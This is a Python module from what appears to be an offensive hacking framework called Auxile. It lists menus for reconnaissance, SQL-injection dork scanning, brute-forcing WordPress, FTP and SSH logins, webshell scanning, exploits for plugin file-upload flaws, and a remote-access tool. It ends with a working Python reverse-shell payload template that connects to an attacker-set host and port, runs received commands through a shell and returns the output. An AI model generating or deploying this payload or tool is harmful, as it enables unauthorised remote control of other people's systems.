##
## function modules
##
## written by @ciku370
##

def printf(msg):
    print(msg.replace('{0}','\033[91m').replace('{1}','\033[0m').replace('[+]','\033[92mINFO\033[0m:').replace('[!]','\033[91mERROR\033[0m:').replace('[w]','\033[93mWARNING\033[0m:').replace('[u]','\033[94mUSAGE\033[0m:').replace('*?','\033[92m-\033[0m').replace('[r]','\033[94mRESULT\033[0m:'))
def show_modules(t):
    if t == '0':
        printf(''':traceroute         traceroute using MRT.
:nping              test ping/Nping.
:dns_lookup         dns lookup.
:reverse_dns        reverse dns lookup.
:host_search        find dns host records.
:shared_dns         find shared dns servers.
:zone_test          zone transfer test.
:whois              whois lookup.
:geoip              Ip location lookup.
:reverse_ip         reverse ip lookup.
:subnet             subnet lookup.
:http_headers       http headers check.
:pagelinks          extract page link from page.
:mxrecords          find mx records.''')
    elif t == '1':
        printf(""":dork               dork scanner with Sqli testing.
:domain_age         domain age checker.
:whatcms            Check Content Management System (CMS).
:hackedmail_check   check if email as ben hacked.
:subdomain          subdomain scanner using AXFR technique.
:honeypot           honeypot detector.
:nmap               advanced nmap.
:port               tcp port scan.
:default_pass       Search default password from manufactor.
:hash_killer        online hash scanner/decrypter.
:rce_scan           remote code/command excecution scanner.""")
    elif t == '2':
        printf(""":wordpress_brute    bruteforcing wordpress panel.
:ftp_brute          bruteforcing FTP login.
:ssh_brute          bruteforcing SSH login.
:dirscan            directory scanner.
:shell              scan available shell on websites.
:adfin              search admin pages.
:upload             search upload pages.
:wpscan             wordpress plugins scanners.
:lfi_scan           scan Local File Inclusion vulnerabilities.
:joom_sql_scan      joomla sqli scanner.
:xss_scan           XSS payload scanner (GET method).""")
    elif t == '3':
           printf(""":wp_sym_exp         Wordpress WP Symposium 14.11 Upload Vulnerability.
:user_pro           wordpress userpro vulnerability scanner.
:wp_user            Wordpress users enumerate bypass to get the website users.
:pres_simple_exp    Simple slide show - arbitrary file upload.
:pres_product_exp   Product page adverts - arbitrary file upload.
:pres_home_exp      Home page advertise - arbitrary file upload.
:pres_column_exp    Column Adverts - arbitrary file upload.
:pres_vtem_exp      Vtem slidecshow - arbitrary file upload.
:pres_wizard_exp    Attribute wizard pro - arbitrary file upload.
:pres_add_exp       Additional product stabs - arbitrary file upload.
:pres_this_exp      Add this plugin - arbitrary file upload.
:pres_advanced_exp  Advanced slider - arbitrary file upload.""")
    elif t == '4':
       printf(""":base16             base16 encryption.
:base32             base32 encryption.
:base64             base64 encryption.
:bin                binnary.
:decimal            decimal.
:hex                hexadecimal.
:rev                reverse strings.
:rot13              ROT 13 cipher.
:md4                md4 hashing.
:md5                md5 hashing.
:sha1               sha1 hashing.
:sha224             sha224 hashing.
:sha256             sha256 hashing.
:sha384             sha384 hashing.
:sha512             sha512 hashing.
:ripemd160          ripemd160 hashing.
:whirlpool          whirlpool hashing.""")

help_ = (''':modules            Show module listing.
:use <module>       Use module.
:help               Show this help message.
:update             Update Auxile framework.
:quit               Close Auxile framework.''')
modules_ = (''':infoga             Information Gathering module.
:scanners           Web aplication scanners module.
:exploits           web exploitation module.
:bruteforce         bruteforcing module.
:encryption         encryption module.
:RAT                Remote Access Administrator.''')
RAT_ = (''':set HOST           ex: set HOST 127.0.0.1
:set PORT           ex: set PORT 4444
:gen                generate payload.
:exploit            start exploit.
:show               show default setting.
:help               show this help message.''')
payload_ = ('''import socket
import subprocess
import os
s = socket.socket()
s.connect(('{}', {}))
while True:
 try:
  cmd = s.recv(1024)
  if cmd[:2] == 'cd':
   os.chdir(cmd[3:])
   dir = os.getcwd()
   s.sendall('sending')
  elif cmd == 'kernel_info':
   results = subprocess.Popen('cat /proc/version', shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
   results = results.stdout.read() + results.stderr.read()
   s.sendall(results)
  else:
   results = subprocess.Popen(cmd, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
   results = results.stdout.read() + results.stderr.read()
   s.sendall('\\n'+results)
 except:pass''')
